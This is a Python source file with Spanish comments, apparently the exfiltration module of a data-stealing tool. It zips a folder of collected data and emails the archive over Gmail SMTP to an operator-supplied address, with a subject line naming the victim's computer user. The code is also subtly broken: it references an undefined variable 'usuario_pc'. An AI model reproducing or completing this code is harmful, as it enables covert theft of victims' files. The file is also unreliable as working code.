import subprocess
import os
import shutil
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

import Variables
from Logs import agregar_log

equipo = Variables.host_y_usuario

print(equipo)

def comprimir():
    folder_path = "lib/binc"
    zip_path = "lib/Data"

    if os.path.exists(folder_path):
        nombre_archivo = shutil.make_archive(zip_path, 'zip', folder_path)

def enviar_data():
    archivo = "lib/Data.zip"
    SMTP_SERVER = 'smtp.gmail.com'
    SMTP_PORT = 587
    gmail_username = '' #agregar el correo remitente
    gmail_password = '' # key del correo remitente
    # objeto SMTP
    smtp = smtplib.SMTP(SMTP_SERVER, SMTP_PORT)
    smtp.starttls()

    # Iniciar sesión en la cuenta de Gmail
    smtp.login(gmail_username, gmail_password)

    # Crear objeto MIMEMultipart
    msg = MIMEMultipart()

    # Configurar remitente, destinatario y asunto del correo
    msg['From'] = gmail_username
    msg['To'] = '' #aqui agrega el correo donde se enviara
    msg['Subject'] = f"Acabas de recibir un gift desde el usuario del pc {usuario_pc}, abrelo"
    
    mensaje = f"Acabas de recibir un gift desde el usuario del pc {usuario_pc}, abrelo"
    msg.attach(MIMEText(mensaje, 'plain'))
    
    if archivo is not None:
        try:
            with open(archivo, 'rb') as adjunto:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(adjunto.read())

            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename= {archivo}')
            msg.attach(part)
        except FileNotFoundError:
            agregar_log(f"No se encontró el archivo: {archivo}")
    # Enviar el correo electrónico
    smtp.send_message(msg)
    # Cerrar conexión 
    smtp.quit()
